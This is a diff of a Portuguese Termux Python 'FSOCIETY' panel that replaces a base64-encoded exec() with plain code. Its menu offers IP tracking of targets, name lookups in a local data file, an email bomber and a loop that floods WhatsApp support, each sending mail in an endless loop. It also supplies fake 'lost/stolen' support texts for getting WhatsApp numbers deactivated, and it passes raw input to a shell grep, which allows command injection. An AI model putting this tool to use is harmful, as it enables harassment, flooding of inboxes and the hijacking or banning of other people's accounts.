IsIGRlc2F0aXZlbSBvIG7Dum1lcm8gZGEgbWluaGEgY29udGEgbyBjaGlwIGUgb3MgZG9jdW1lbnRvcyBmb3JhbSByb3ViYWRvcyBlc3NhIGNvbnRhIHBvc3N1aSBkYWRvcyBpbXBvcnRhbnRlcywgZW50w6NvIHBvciBmYXZvciBkZXNhdGl2ZW0gbWluaGEgY29udGEsIG7Dum1lcm86JykKCQkJCQlwcmludChmJ1xue0N9ICAgICAgICAgICAgIC0tPT0tLT09LS09PS0tPT0tLT09LS1cbicpCgkJCQkJeCgpCgkJCQkJY2hvaWNlX3R4dCA9IGlucHV0KGYnXG5cbiAgIHtSfT4+PntDfSAnKQoJCQkJCWlmIGNob2ljZV90eHQgPT0gJ1gnOgoJCQkJCQlicmVhawoJCQkJCQkKCQkJCQkJCQkJCQkJCgkKCQojIyMjIyMjIyMjIyMjIyMjIyMKIyBPUMSGw4NPIDIgLSBOT01FICMKIyMjIyMjIyMjIyMjIyMjIyMjCgkKCQoJaWYgY2hvaWNlID09ICcyJzoKCQl3aGlsZSBUcnVlOgoJCQlwcmludChmJyAgICB7Q309PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScpCgkJCWNsZWFyKCkKCQkJcHJpbnQoZidcbntSfSAgICAgICAgIOKUgOKUgOKWhOKUgOKUgOKUgOKUgOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKUgOKUgOKUgOKUgOKWhOKUgOKUgOKUgFxuICAgICAgICAg4pSA4paA4paA4paE4pSA4paE4paI4paI4paI4paI4paI4paI4paI4paI4paI4paE4pSA4paE4paA4paA4pSA4pSAXG4gICAgICAgICDilIDilIDilIDilIDilIDilojilojilIDiloDilojilojilojiloDilIDilojilojilIDilIDilIDilIDilIDilIBcbiAgICAgICAgIOKUgOKUgOKUgOKWhOKUgOKWgOKWiOKWiOKWiOKWiOKWgOKWiOKWiOKWiOKWiOKWgOKUgOKWhOKUgOKUgOKUgOKUgFxuICAgICAgICAg4pSA4paA4paI4pSA4pSA4pSA4pSA4paI4paI4paA4paI4paA4paI4paI4pSA4pSA4pSA4pSA4paI4paA4pSA4pSAJykKCQkJcHJpbnQoZidcbiAgICB7Q31be0d9WHtDfV0gVk9MVEFSIFBBUkEgTyBNRU5VJykKCQkJcHJpbnQoZidcbiAgICB7Q309PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScpCgkJCW5hbWUgPSBpbnB1dChmJyAgICB7Un0+Pj4gJykKCQkJcHJpbnQoZicgICAge0N9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQoJCQlwcmludChmJ1xuICAgIHtDfVt7Un1BR1VBUkRFIXtDfV0nLCBlbmQ9JycpCgkJCXByaW50KCcgTyBOT01FIHt9IEVTVMOBIFNFTkRPIEFOQUxJWkFETy4uLicuZm9ybWF0KG5hbWUpKQoJCQlvcy5zeXN0ZW0oJ2dyZXAgLVIge30gL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL2hvbWUvcGFpbmVsZnNvL2RhZG9zLnR4dCcuZm9ybWF0KG5hbWUpKQoJCQlwcmludChmJ1xue0N9ICAgIFt7Un0qe0N9XSBQUkVTU0lPTkUge0d9RU5URVJ7Q30gUEFSQSBSRUFMSVpBUiBVTUEgTk9WQSBDT05TVUxUQS4nKQoJCQlpZiBuYW1lID09ICdYJzoKCQkJCWJyZWFrCgkJCWEgPSBpbnB1dChmJ1xuICAgIHtSfT4+PiAnKQoJCQlpZiBhID09ICcwJzoKCQkJCWJyZWFrCgkKCQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIE9Qw4fDg08gIE1FTlUgLSBKVU5UQVIgU0UgQSBGU09DSUVUWSAjCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgoKCWlmIGNob2ljZSA9PSAnRlNPJzoKCSAgICBvcy5zeXN0ZW0oJ3Rlcm11eC1vcGVuLXVybCBodHRwczovL2FicmUuYWkvZ29vZ2xlLWNvbnN1bHRhLW5tciAnKQoJCgkKIyMjIyMjIyMjIyMjIyMjIyMjIyMKI09Qw4fDg08gRVhJVCAtIE1FTlUgIwojIyMjIyMjIyMjIyMjIyMjIyMjIwoKCQkKCWlmIGNob2ljZSA9PSAnRVhJVCc6CgkJYnJlYWsKCQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIE9Qw4fDg08gW05VTV0gLSBOVU1FUk8gRE9TIENSSUFET1JFUyAjCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkKCQoJaWYgY2hvaWNlID09ICdOVU0nOgoJCWNsZWFyKCkKCQlwcmludChmJ3tSfSAgIFxuICAgICAg4pSA4pSA4paE4pSA4pSA4pSA4pSA4paE4paE4paE4paE4paE4paE4paE4pSA4pSA4pSA4pSA4paE4pSA4pSA4pSAXG4gICAgICDilIDiloDiloDiloTilIDiloTilojilojilojilojilojilojilojilojilojiloTilIDiloTiloDiloDilIDilIBcbiAgICAgIOKUgOKUgOKUgOKUgOKUgOKWiOKWiOKUgOKWgOKWiOKWiOKWiOKWgOKUgOKWiOKWiOKUgOKUgOKUgOKUgOKUgOKUgFxuICAgICAg4pSA4pSA4pSA4paE4pSA4paA4paI4paI4paI4paI4paA4paI4paI4paI4paI4paA4pSA4paE4pSA4pSA4pSA4pSAXG4gICAgICDilIDiloDilojilIDilIDilIDilIDilojilojiloDilojiloDilojilojilIDilIDilIDilIDilojiloDilIDilIAnKQoJCXgoKQoJCXByaW50KGYnXG4gICB7Un1PQlM6e0N9IEFNQk9TIFPDg08gREVTRU5WT0xWRURPUkVTIERFU1NBIEZFUlJBTUVOVEEuJykKCQlwcmludCgnXG4nKQoJCXByaW50KGYnXG4gICAtLT09LS09PS0tPT0tLT09LS09PS0tPT0nKQoJCXByaW50KGYnXG4gICB7Q31be0d9MDF7Q31dIE7Dmk1FUk8gRE8gU1dFRVQnKQoJCXByaW50KGYnICAge0N9W3tHfTAye0N9XSBOw5pNRVJPIERPIExJUEVaSU4nKQoJCXByaW50KGYnXG4gICAtLT09LS09PS0tPT0tLT09LS09PS0tPT0nKQoJCWNob2ljZV9udW1iZXJfY3JlYXRvcnMgPSBpbnB1dChmJ1xuXG5cbntSfSAgID4+PntDfSAnKQoJCWlmIGNob2ljZV9udW1iZXJfY3JlYXRvcnMgPT0gJ1gnOgoJCQlicmVhawoJCWlmIGNob2ljZV9udW1iZXJfY3JlYXRvcnMgPT0gJzEnOgoJCQlvcy5zeXN0ZW0oJ3Rlcm11eC1vcGVuLXVybCBodHRwczovL1dBLm1lLzU1NTE5OTc3NzM2NzIgJykKCQlpZiBjaG9pY2VfbnVtYmVyX2NyZWF0b3JzID09ICcyJzoKCQkJb3Muc3lzdGVtKCd0ZXJtdXgtb3Blbi11cmwgaHR0cHM6Ly9XQS5tZS81NTM1ODgzMTc2ODEnKQ=='''))
-exec(xvideo)
+global R,B,C,Y,G,RT,CY,CO
+CO='\033[m';R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';CY='\033[1;36m';Y='\033[1;33m';G='\033[1;32m';RT='\033[;0m';NO_FORMAT="\033[0m";C_GREY89="\033[38;5;254m";C_RED1="\033[48;5;196m"
+
+
+import os, sys, smtplib, json, requests
+from time import sleep
+
+try:
+	import pyfiglet
+except:
+	os.system('pip install pyfiglet')
+def clear():
+	os.system('clear')
+def x():
+	print(f'   {C}[{G}X{C}]{R} RETORNAR')	
+	
+####################
+#                  #
+#  MENU PRINCIPAL  #          
+#                  #
+####################
+
+
+while True:
+	clear()
+	print(f'    {G}——— {C}[{R}*{C}] CODIFICADO POR: {G}LIPEZIN{C} and {G}Sweet{C} [{R}*{C}]{G} ———')
+	result = pyfiglet.figlet_format(" MENU", font = "5lineoblique" )
+
+	print(f'''{C}{G}{result}''')
+	print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
+	print(f'   //--==--==--==--==--==--==--==--==--==--==--\\')
+	print(f'   11                                         11')
+	print(f'   11 {C}[{G}01{C}]{R} CONSULTA IP {C}[{G}ON{C}]{C}                   11')
+	print(f'   11 {C}[{G}02{C}]{R} CONSULTA NOME{C} [{G}ON{C}]                 11')
+	print(f'   11 {C}[{G}03{C}]{R} TEXTOS SUPORTE   {C}                  11')
+	print(f'   11 {C}[{G}04{C}]{R} NMAP           {C}                    11')
+	print(f'   11 {C}[{G}05{C}]{R}                    OFF {C}            11')
+	print(f'   11 {C}[{G}06{C}]{R} PACKs (PRESENTES)        {C}          11')
+	print(f'   11 {C}[{G}07{C}]{R} EMAIL BOMBER             {C}          11')
+	print(f'   11 {C}[{G}08{C}]{R} RESETAR TEMPO DO COD    {C}           11')
+	print(f'   11 {C}[{G}09{C}]{R} TIRAR NÚMERO DO BAN      {C}          11')
+	print(f'   11 {C}[{G}10{C}]{R} phoneinfoga off             {C}          11')
+	print(f'   11 {C}[{G}11{C}]{R} MOSTRAR MEU IP           {C}          11')
+	print(f'   11 {C}[{G}12{C}]{R} CONSULTA CNPJ{C} [{G}ON{C}]       {C}          11')
+	print(f'   11                                         11')
+	print(f'   \\--==--==--==--==--==--==--==--==--==--==--//')
+	print(f'   //                                         \\1')
+	print(f'   11 {C}[{G}NUM{C}]{R} NÚMERO DOS CRIADORES       {C}       11')
+	print(f'   11 {C}[{G}FSO{C}]{R} rastrear numero     {C}       11')
+	print(f'   11 {C}[{G}EXIT{C}]{R} ENCERRAR A FERRAMENTA  {C}          11')
+	print(f'   11                                         11')
+	print(f'   \\--==--==--==--==--==--==--==--==--==--==--//')
+	choice = input(f'\n\n\n{R}   >>>{C} ')
+	
+	
+	if choice == '4':
+		        os.system('git clone https://github.com/nmap/nmap')
+		        
+		 
+		
+	
+	
+###################
+# OPCAO 12 - CNPJ #	
+###################
+	if choice == '12':
+				#59291534000167
+				while True:
+					clear()
+					result = pyfiglet.figlet_format(" CONSULTA\n     CNPJ", font = "slant" )
+					print(f'''{C}{G}
+					{result}''')
+					x()
+					print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
+					print(f'   {C}\\--==--==--==--==--==--==--==--==--==--==--//')
+					cnpj_alvo = input(f'{G}       DIGITE O CNPJ{R} >>>{C} ')
+					if cnpj_alvo == 'X':
+						break
+					print(f'   {C}//--==--==--==--==--==--==--==--==--==--==--\\')
+					cnpj_data = requests.get('https://www.receitaws.com.br/v1/cnpj/{}'.format(cnpj_alvo)).json()
+					print(f'\n\n           {G}       DADOS ABAIXO')
+					print(f'   {C}//--==--==--==--==--==--==--==--==--==--==--\\ \n')
+					print(cnpj_data)
+					print(f'\n\n   {C}[{R}*{C}] PRESSIONE {G}ENTER{C} PARA REALIZAR UMA NOVA CONSULTA.')
+					cnpj_menu = input(f'\n{R}   >>>{C} ')
+					if cnpj_menu == 'X':
+						break
+	
+
+	
+###########################
+# OPC 11 - MOSTRAR MEU IP #
+###########################	
+	
+	if choice == '11':
+			clear()
+			print(f'\n\n               {G}DADOS DO SEU IP ATUAL: ')
+			print(f'   {C}\\--==--==--==--==--==--==--==--==--==--==--//')
+			print(f'{C}   [{R}*{C}] pode ser usado para testar VPNs!')
+			ip_ch = requests.get('http://ip-api.com/json/')
+			ip_ch = ip_ch.json()
+			status = ip_ch["status"]
+			country = ip_ch["country"]
+			countryCode = ip_ch["countryCode"]
+			region = ip_ch["region"]
+			regionName = ip_ch["regionName"]
+			city = ip_ch["city"]
+			zip = ip_ch["zip"]
+			lat = ip_ch["lat"]
+			lon = ip_ch["lon"]
+			timezone = ip_ch["timezone"]
+			isp = ip_ch["isp"]
+			org = ip_ch["org"]
+			AS = ip_ch["as"]
+			query = ip_ch["query"]
+			print('\n')
+			print(f'{G}   STATUS:{C}', status)
+			print(f'{G}   COUNTRY:{C}', country)
+			print(f'{G}   COUNTRYCODE:{C}', countryCode)
+			print(f'{G}   REGION:{C}', region)
+			print(f'{G}   REGION NAME:{C}', regionName)
+			print(f'{G}   CITY:{C}', city)
+			print(f'{G}   ZIP:{C}', zip)
+			print(f'{G}   LAT:{C}', lat)
+			print(f'{G}   LON:{C}', lon)
+			print(f'{G}   TIMEZONE:{C}', timezone)
+			print(f'{G}   ISP:{C}', isp)
+			print(f'{G}   ORG:{C}', org)
+			print(f'{G}   AS:{C}', AS)
+			print(f'{G}   QUERY:{C}', query)
+
+			print(f'\n   {C}[{R}*{C}] PRESSIONE {G}ENTER{C} PARA RETORNAR AO MENU.')
+			iptrack = input(f'\n\n{R}   >>>{C} ')
+			
+			
+
+	
+	
+######################
+# IP TRACKER - OPC 1 #
+######################
+	
+	if choice == '1':
+		while True:
+			clear()
+			result = pyfiglet.figlet_format("IP TRACKER", font = "slant" )
+			print(f'''{C}{G}{result}''')
+			print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
+			print(f'   {C}\\--==--==--==--==--==--==--==--==--==--==--//')
+			
+			x()
+			ipvitma = input(f'\n{G}   IP TARGET{R} >>>{C} ')
+			if ipvitma == 'X':
+				break
+			print(f'\n\n\n                 {G} LISTA DOS DADOS: ')
+			print(f'   {C}\\--==--==--==--==--==--==--==--==--==--==--//')
+			ip_ch = requests.get('http://ip-api.com/json/{}'.format(ipvitma))
+			ip_ch = ip_ch.json()
+			status = ip_ch["status"]
+			country = ip_ch["country"]
+			countryCode = ip_ch["countryCode"]
+			region = ip_ch["region"]
+			regionName = ip_ch["regionName"]
+			city = ip_ch["city"]
+			zip = ip_ch["zip"]
+			lat = ip_ch["lat"]
+			lon = ip_ch["lon"]
+			timezone = ip_ch["timezone"]
+			isp = ip_ch["isp"]
+			org = ip_ch["org"]
+			AS = ip_ch["as"]
+			query = ip_ch["query"]
+			print('\n')
+			print(f'{G}   STATUS:{C}', status)
+			print(f'{G}   COUNTRY:{C}', country)
+			print(f'{G}   COUNTRYCODE:{C}', countryCode)
+			print(f'{G}   REGION:{C}', region)
+			print(f'{G}   REGION NAME:{C}', regionName)
+			print(f'{G}   CITY:{C}', city)
+			print(f'{G}   ZIP:{C}', zip)
+			print(f'{G}   LAT:{C}', lat)
+			print(f'{G}   LON:{C}', lon)
+			print(f'{G}   TIMEZONE:{C}', timezone)
+			print(f'{G}   ISP:{C}', isp)
+			print(f'{G}   ORG:{C}', org)
+			print(f'{G}   AS:{C}', AS)
+			print(f'{G}   QUERY:{C}', query)
+
+			print(f'\n   {C}[{R}*{C}] PRESSIONE {G}ENTER{C} PARA REALIZAR UMA NOVA CONSULTA.')
+			iptrack = input(f'\n\n{R}   >>>{C} ')
+			if iptrack == 'X':
+				break
+
+######################
+# RESETAR COD DO ZAP #
+######################
+	
+	if choice == '8':
+		while True:
+			clear()
+			result = pyfiglet.figlet_format("RESETA COD", font = "slant" )
+			print(f'''{C}{G}{result}''')
+			print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
+			print(f'   --==--==--==--==--==--==--==--==--==--==--\n')
+			print(f'   {C}[{G}OBS{C}] nós não teremos acesso a senha de seu email!\n         o código está aberto para comprovar isso.')
+			x()
+			email = input(f'{G}   SEU EMAIL:{C} ')
+			if email == 'X':
+				break
+			sender_email = "{}".format(email)
+			rec_email = "support@whatsapp.com"
+			password = input(str(f"   {G}DIGITE A SENHA:{C} "))
+			if password == 'X':
+				break
+			number = input(f'{G}   DIGITE SEU NÚMERO (EX: +55 51 9****-****):{C} ')
+			if msgf == 'X':
+				break
+			subject = "titulo"
+			message = "oi"
+			server = smtplib.SMTP('smtp.gmail.com', 587)
+			server.starttls()
+			server.login(sender_email, password)
+			print(f"{C}   [{R}*{C}]{G} LOGIN EFETUADO!")
+			while True:
+				server.sendmail(sender_email, rec_email, message)
+				print(f"{G}O EMAIL FOI ENVIADO COM SUCESSO! ALVO:{R}", rec_email)
+			
+	
+	
+	############################
+	# EMAILBOMBER PERSONALIZAV #
+	################№###########
+	
+	
+	
+	if choice == '7':
+		while True:
+			clear()
+			result = pyfiglet.figlet_format("email bomber", font = "slant" )
+			print(f'''{C}{G}{result}''')
+			print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
+			print(f'   --==--==--==--==--==--==--==--==--==--==--\n')
+			print(f'   {C}[{G}OBS{C}] nós não teremos acesso a senha de seu email!\n         o código está aberto para comprovar isso.')
+			x()
+			alvo = input(f'\n\n{G}   EMAIL DO ALVO:{C} ')
+			if alvo == 'X':
+				break
+			email = input(f'{G}   SEU EMAIL:{C} ')
+			if email == 'X':
+				break
+			sender_email = "{}".format(email)
+			rec_email = "{}".format(alvo)
+			password = input(str(f"   {G}DIGITE A SENHA:{C} "))
+			if password == 'X':
+				break
+			msgf = input(f'{G}   MENSAGEM QUE IRÁ SER ENVIADA:{C} ')
+			if msgf == 'X':
+				break
+			subject = "oi"
+			message = "{}".format(msgf)
+			server = smtplib.SMTP('smtp.gmail.com', 587)
+			server.starttls()
+			server.login(sender_email, password)
+			print(f"{C}   [{R}*{C}]{G} LOGIN EFETUADO!")
+			while True:
+				server.sendmail(sender_email, rec_email, message)
+				print(f"{G}O EMAIL FOI ENVIADO COM SUCESSO! ALVO:{R}", rec_email)
+			
+
+#############################
+# OPÇÃO 3 - TEXTOS SUPORTES #
+#############################
+
+
+	if choice == '3':
+		while True:
+			clear()
+			result = pyfiglet.figlet_format(" TEXTOS", font = "slant" )
+			print(f'''{C}{G}
+			{result}''')
+			print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
+			print(f'\n\n{C}   --==--==--==--==--==--\n')
+			print(f'   {C}[{G}01{C}]{R} TEXTO DESATIVAÇÃO')
+			print(f'   {C}[{G}02{C}]{R} TEXTOS TIRAR DO BAN')
+			print(f'   {C}[{G}03{C}]{R} TEXTOS RESETAR COD')
+			print(f'\n{C}   --==--==--==--==--==--')
+			print(f'   {C}[{G}X{C}]{R} RETORNAR')
+			choice_txt = input(f'\n\n{R}   >>>{C} ')
+			if choice_txt == 'X':
+				break
+				
+				#########################
+				# OPÇÃO 3 - RESETAR COD #
+				#########################
+			if choice_txt == '3':
+				while True:
+					clear()
+					print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
+					print(f'{C}             --==--==--==--==--==--\n')
+					print(f'{G}   Assunto: Não consigo receber código de verificação do whatsapp{C}\nMeu número (número) está no suporte ,alguém solicitou o código por engano. Meu número uso para trabalho tenho uma empresa de empreendimento e preciso desta conta por favor retirem meu número. Reiniciem meu código SMS')
+					print(f'\n{C}             --==--==--==--==--==--\n')
+					x()
+					ban = input(f'\n   {R}>>>{C} ')
+					if ban == 'X':
+						break
+						
+						
+			###########№###############	
+			# OPÇÃO 2 - TXT's SUPORTE #
+			#############№#############
+			
+			if choice_txt == '2':
+				while True:
+					clear()
+					print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
+					print(f'{C}             --==--==--==--==--==--\n')
+					print(f'{G}   Assunto: Meu numero novo foi banido sem nenhum motivo.\n   {C}Meu número é novo,e com ele abri recentemente uma indústria e nessa indústria necessito urgentemente da minha conta não desrespeitei nenhuma regra da política de privacidade,logo peço que a Equipe de suporte do whatsapp tome providências o mais rapido possivel para eu poder ter acesso aos materiais da minha indústria [numero]')
+					print(f'\n{C}             --==--==--==--==--==--\n')
+					x()
+					ban = input(f'\n   {R}>>>{C} ')
+					if ban == 'X':
+						break
+						
+						
+
+					
+				
+						
+#################################
+# TXT'S SUPORTE - 1 DESATIVAÇÃO #		#################################
+			
+			
+			if choice_txt == '1':
+				while True:
+					clear()
+					print(f'              {C}NÓS SOMOS A {R}FSOCIETY{C}')
+					print(f'{C}             --==--==--==--==--==--\n')
+					print(f'\n   {G}Assunto:Perdido/Roubado\n{C}   Meu número foi perdido e roubado, teriam como vocês desativá-lo? Ele contêm dados importates Número:\n')
+					print(f'{C}             --==--==--==--==--==--\n')
+					print(f'{G}   Assunto: Perdido/Roubado{C}\n   Por favor, desativem o número da minha conta o chip e os documentos foram roubados essa conta possui dados importantes, então por favor desativem minha conta, número:')
+					print(f'\n{C}             --==--==--==--==--==--\n')
+					x()
+					choice_txt = input(f'\n\n   {R}>>>{C} ')
+					if choice_txt == 'X':
+						break
+						
+												
+	
+	
+##################
+# OPĆÃO 2 - NOME #
+##################
+	
+	
+	if choice == '2':
+		while True:
+			print(f'    {C}======================================')
+			clear()
+			print(f'\n{R}         ──▄────▄▄▄▄▄▄▄────▄───\n         ─▀▀▄─▄█████████▄─▄▀▀──\n         ─────██─▀███▀─██──────\n         ───▄─▀████▀████▀─▄────\n         ─▀█────██▀█▀██────█▀──')
+			print(f'\n    {C}[{G}X{C}] VOLTAR PARA O MENU')
+			print(f'\n    {C}======================================')
+			name = input(f'    {R}>>> ')
+			print(f'    {C}======================================')
+			print(f'\n    {C}[{R}AGUARDE!{C}]', end='')
+			print(' O NOME {} ESTÁ SENDO ANALIZADO...'.format(name))
+			os.system('grep -R {} /data/data/com.termux/files/home/painelfso/dados.txt'.format(name))
+			print(f'\n{C}    [{R}*{C}] PRESSIONE {G}ENTER{C} PARA REALIZAR UMA NOVA CONSULTA.')
+			if name == 'X':
+				break
+			a = input(f'\n    {R}>>> ')
+			if a == '0':
+				break
+	
+	
+######################################
+# OPÇÃO  MENU - JUNTAR SE A FSOCIETY #
+######################################
+
+
+	if choice == 'FSO':
+	    os.system('termux-open-url https://abre.ai/google-consulta-nmr ')
+	
+	
+####################
+#OPÇÃO EXIT - MENU #
+####################
+
+		
+	if choice == 'EXIT':
+		break
+	
+######################################
+# OPÇÃO [NUM] - NUMERO DOS CRIADORES #
+######################################
+	
+	
+	if choice == 'NUM':
+		clear()
+		print(f'{R}   \n      ──▄────▄▄▄▄▄▄▄────▄───\n      ─▀▀▄─▄█████████▄─▄▀▀──\n      ─────██─▀███▀─██──────\n      ───▄─▀████▀████▀─▄────\n      ─▀█────██▀█▀██────█▀──')
+		x()
+		print(f'\n   {R}OBS:{C} AMBOS SÃO DESENVOLVEDORES DESSA FERRAMENTA.')
+		print('\n')
+		print(f'\n   --==--==--==--==--==--==')
+		print(f'\n   {C}[{G}01{C}] NÚMERO DO SWEET')
+		print(f'   {C}[{G}02{C}] NÚMERO DO LIPEZIN')
+		print(f'\n   --==--==--==--==--==--==')
+		choice_number_creators = input(f'\n\n\n{R}   >>>{C} ')
+		if choice_number_creators == 'X':
+			break
+		if choice_number_creators == '1':
+			os.system('termux-open-url https://WA.me/5551997773672 ')
+		if choice_number_creators == '2':
+			os.system('termux-open-url https://WA.me/553588317681')
